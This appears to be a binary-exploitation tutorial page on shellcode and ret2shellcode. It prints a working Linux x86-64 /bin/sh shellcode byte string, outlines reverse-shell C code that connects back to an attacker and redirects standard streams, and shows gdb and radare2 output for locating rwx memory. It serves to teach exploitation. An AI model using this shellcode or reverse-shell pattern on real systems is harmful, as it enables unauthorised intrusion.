# Shellcode

### Example

A very good resource for finding shellcode is shell-storm: [http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)

I have chosen a Linux x86-64 shellcode which executes /bin/sh

> [http://shell-storm.org/shellcode/files/shellcode-806.php](http://shell-storm.org/shellcode/files/shellcode-806.php)

```python
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
```

### What is it?

Shellcode is essentially our own compiled assembly, which can gain us a "shell". This "shell" is essentially a terminal, in which we can execute our own commands from, such as `ls`, `whoami`, `python -c 'import pty;pty.spawn("/bin/sh")'`, `sudo -l` etc. The way that this is done is by many ways. One way is to create a socket which will listen on the attackers ip and port, and then send a `dup2()` command to bind the attacker's socket to the program's input, output, error.

```c
// Open a TCP connection to an attacker controlled machine or server
sock = socket(AF_INET, SOCK_STREAM);
connect(sock, /* Attacker's ip and port */);

// bind socket to program's stdin/out/err
dup2(sock, 0); // stdin
dup2(sock, 1); // stdout
dup2(sock, 2); // stderr
```

We can compile this, send it over to the binary, and bam, we have a shell!!

However, there is a slight caveat to this. Where are we going to store our shellcode? How can we get it to execute? We can't execute things from the stack, or can we?

This is where we need to have a look at the permissions that certain pages have in the binary. We can get our shellcode to be stored somewhere, or written to, and then executed. For this to happen, we must have a page, or section of the binary which is mapped, to have a `rwx` permission. This'll allow us to `Read, write, execute` any code inside that page. We can view what pages have what permissions by using gdb or radare2:

{% tabs %}
{% tab title="gdb" %}
```c
$ gdb ./file // use --nx if you have an extension for gdb
(gdb) r
^c
(gdb) p (int) getpid()
(gdb) shell cat /proc/pid/maps
```

```java
$ gdb --nx ./eXit 
GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1
...
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./eXit...
(No debugging symbols found in ./eXit)
(gdb) r
Starting program: ./eXit 
--- eXit ---

It's time to leave the Land of Ecodelia...
Press Enter to continue
^C
Program received signal SIGINT, Interrupt.
0x00007ffff7ed1fb2 in __GI___libc_read (fd=0, buf=0x5555555596b0, nbytes=1024)
    at ../sysdeps/unix/sysv/linux/read.c:26
26	../sysdeps/unix/sysv/linux/read.c: No such file or directory.
(gdb) p getpid()
'getpid' has unknown return type; cast the call to its declared return type
(gdb) print (int) getpid()
$1 = 7888
(gdb) shell cat /proc/7888/maps
555555554000-555555555000 r--p 00000000 08:05 25165869                   ./eXit
555555555000-555555556000 r-xp 00001000 08:05 25165869                   ./eXit
555555556000-555555557000 r--p 00002000 08:05 25165869                   ./eXit
555555557000-555555558000 r--p 00002000 08:05 25165869                   ./eXit
555555558000-555555559000 rw-p 00003000 08:05 25165869                   ./eXit
555555559000-55555557a000 rw-p 00000000 00:00 0                          [heap]
7ffff7dc1000-7ffff7de6000 r--p 00000000 08:05 28318069                   /usr/lib/x86_64-linux-gnu/libc-2.31.so
7ffff7de6000-7ffff7f5e000 r-xp 00025000 08:05 28318069                   /usr/lib/x86_64-linux-gnu/libc-2.31.so
7ffff7f5e000-7ffff7fa8000 r--p 0019d000 08:05 28318069                   /usr/lib/x86_64-linux-gnu/libc-2.31.so
7ffff7fa8000-7ffff7fa9000 ---p 001e7000 08:05 28318069                   /usr/lib/x86_64-linux-gnu/libc-2.31.so
7ffff7fa9000-7ffff7fac000 r--p 001e7000 08:05 28318069                   /usr/lib/x86_64-linux-gnu/libc-2.31.so
7ffff7fac000-7ffff7faf000 rw-p 001ea000 08:05 28318069                   /usr/lib/x86_64-linux-gnu/libc-2.31.so
7ffff7faf000-7ffff7fb5000 rw-p 00000000 00:00 0 
7ffff7fcb000-7ffff7fce000 r--p 00000000 00:00 0                          [vvar]
7ffff7fce000-7ffff7fcf000 r-xp 00000000 00:00 0                          [vdso]
7ffff7fcf000-7ffff7fd0000 r--p 00000000 08:05 28317854                   /usr/lib/x86_64-linux-gnu/ld-2.31.so
7ffff7fd0000-7ffff7ff3000 r-xp 00001000 08:05 28317854                   /usr/lib/x86_64-linux-gnu/ld-2.31.so
7ffff7ff3000-7ffff7ffb000 r--p 00024000 08:05 28317854                   /usr/lib/x86_64-linux-gnu/ld-2.31.so
7ffff7ffc000-7ffff7ffd000 r--p 0002c000 08:05 28317854                   /usr/lib/x86_64-linux-gnu/ld-2.31.so
7ffff7ffd000-7ffff7ffe000 rw-p 0002d000 08:05 28317854                   /usr/lib/x86_64-linux-gnu/ld-2.31.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
(gdb) 
```
{% endtab %}

{% tab title="gdb-gef / gdb-peda" %}
```c
$ gdb ./file
gdb-peda$ r
^c
gdb-peda$ vmmap
```

```java
$ gdb ./eXit
GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1
...
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./eXit...
(No debugging symbols found in ./eXit)
gdb-peda$ r
Starting program: ./eXit 
--- eXit ---

It's time to leave the Land of Ecodelia...
Press Enter to continue
^C
Program received signal SIGINT, Interrupt.
[----------------------------------registers-----------------------------------]
...
26	../sysdeps/unix/sysv/linux/read.c: No such file or directory.
gdb-peda$ vmmap
Start              End                Perm	Name
0x0000555555554000 0x0000555555555000 r--p	./eXit
0x0000555555555000 0x0000555555556000 r-xp	./eXit
0x0000555555556000 0x0000555555557000 r--p	./eXit
0x0000555555557000 0x0000555555558000 r--p	./eXit
0x0000555555558000 0x0000555555559000 rw-p	./eXit
0x0000555555559000 0x000055555557a000 rw-p	[heap]
0x00007ffff7dc1000 0x00007ffff7de6000 r--p	/usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7de6000 0x00007ffff7f5e000 r-xp	/usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7f5e000 0x00007ffff7fa8000 r--p	/usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa8000 0x00007ffff7fa9000 ---p	/usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa9000 0x00007ffff7fac000 r--p	/usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fac000 0x00007ffff7faf000 rw-p	/usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7faf000 0x00007ffff7fb5000 rw-p	mapped
0x00007ffff7fcb000 0x00007ffff7fce000 r--p	[vvar]
0x00007ffff7fce000 0x00007ffff7fcf000 r-xp	[vdso]
0x00007ffff7fcf000 0x00007ffff7fd0000 r--p	/usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7fd0000 0x00007ffff7ff3000 r-xp	/usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ff3000 0x00007ffff7ffb000 r--p	/usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 --xp	[vsyscall]
gdb-peda$
```
{% endtab %}

{% tab title="radare2" %}
```c
$ r2 -dA ./file
[0x7f92d71ee100]> dcu entry0
[0x55b76f81b1a0]> dm
```

```java
$ r2 -dA ./eXit
Process with PID 7600 started...
= attach 7600 7600
bin.baddr 0x55b76f81a000
Using 0x55b76f81a000
asm.bits 64
[Cannot find function at 0x55b76f81b1a0. and entry0 (aa)
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[TOFIX: aaft can't run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x7f92d71ee100]> dcu entry0
Continue until 0x55b76f81b1a0 using 1 bpsize
hit breakpoint at: 55b76f81b1a0
[0x55b76f81b1a0]> dm
0x000055b76f81a000 - 0x000055b76f81b000 - usr     4K s r-- ./eXit ./eXit ; sym.imp.__cxa_finalize
0x000055b76f81b000 - 0x000055b76f81c000 * usr     4K s r-x ./eXit ./eXit ; map.eXit.r_x
0x000055b76f81c000 - 0x000055b76f81d000 - usr     4K s r-- ./eXit ./eXit ; map.eXit.r
0x000055b76f81d000 - 0x000055b76f81e000 - usr     4K s r-- ./eXit ./eXit ; map.eXit.rw
0x000055b76f81e000 - 0x000055b76f81f000 - usr     4K s rw- ./eXit ./eXit ; section..data
0x00007f92d6fe3000 - 0x00007f92d7008000 - usr   148K s r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f92d7008000 - 0x00007f92d7180000 - usr   1.5M s r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f92d7180000 - 0x00007f92d71ca000 - usr   296K s r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f92d71ca000 - 0x00007f92d71cb000 - usr     4K s --- /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f92d71cb000 - 0x00007f92d71ce000 - usr    12K s r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f92d71ce000 - 0x00007f92d71d1000 - usr    12K s rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f92d71d1000 - 0x00007f92d71d7000 - usr    24K s rw- unk0 unk0
0x00007f92d71ed000 - 0x00007f92d71ee000 - usr     4K s r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007f92d71ee000 - 0x00007f92d7211000 - usr   140K s r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so ; map.usr_lib_x86_64_linux_gnu_ld_2.31.so.r_x
0x00007f92d7211000 - 0x00007f92d7219000 - usr    32K s r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so ; map.usr_lib_x86_64_linux_gnu_ld_2.31.so.r
0x00007f92d721a000 - 0x00007f92d721b000 - usr     4K s r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so ; map.usr_lib_x86_64_linux_gnu_ld_2.31.so.rw
0x00007f92d721b000 - 0x00007f92d721c000 - usr     4K s rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007f92d721c000 - 0x00007f92d721d000 - usr     4K s rw- unk1 unk1 ; map.unk0.rw
0x00007fffae0ae000 - 0x00007fffae0cf000 - usr   132K s rw- [stack] [stack] ; map.stack_.rw
0x00007fffae0f4000 - 0x00007fffae0f7000 - usr    12K s r-- [vvar] [vvar] ; map.vvar_.r
0x00007fffae0f7000 - 0x00007fffae0f8000 - usr     4K s r-x [vdso] [vdso] ; map.vdso_.r_x
0xffffffffff600000 - 0xffffffffff601000 - usr     4K s --x [vsyscall] [vsyscall] ; map.vsyscall_.__x
[0x55b76f81b1a0]> 
```
{% endtab %}
{% endtabs %}

Our plan of attack, to perform a _ret2shellcode_ _attack_, __would be to overflow the buffer, enter in an address which points to an area in the `rwx` memory map and add our shellcode there. When we execute this, it should give us a shell back!!

